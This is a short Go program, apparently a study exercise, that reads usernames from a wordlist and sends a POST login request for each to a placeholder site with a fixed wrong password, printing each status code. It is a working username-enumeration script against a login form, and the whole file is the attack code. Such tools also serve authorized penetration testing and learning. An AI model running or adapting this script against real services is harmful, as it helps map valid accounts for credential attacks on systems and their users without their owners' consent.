package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net/http"
	"os"
)

func main() {
	inputfile := "F:\\addl\\go\\GoStudy\\J1-io\\Write_world3-worllist\\dict.txt"
	file, err := os.Open(inputfile)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer file.Close()
	url := "http://target.com/login"
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		username := scanner.Text()

		data := []byte(fmt.Sprintf("username=%s&password=wrongpass", username))

		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		if err != nil {
			fmt.Println("发包失败", err)
			continue
		}
		// 设置请求头（模拟表单提交）
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			fmt.Println("请求失败")
			continue
		}

		fmt.Printf("尝试用户名：%s-	状态码 %d\n", username, resp.StatusCode)
		resp.Body.Close()

	}

	if err := scanner.Err(); err != nil {
		fmt.Println("读取文件出错", err)
	}

}
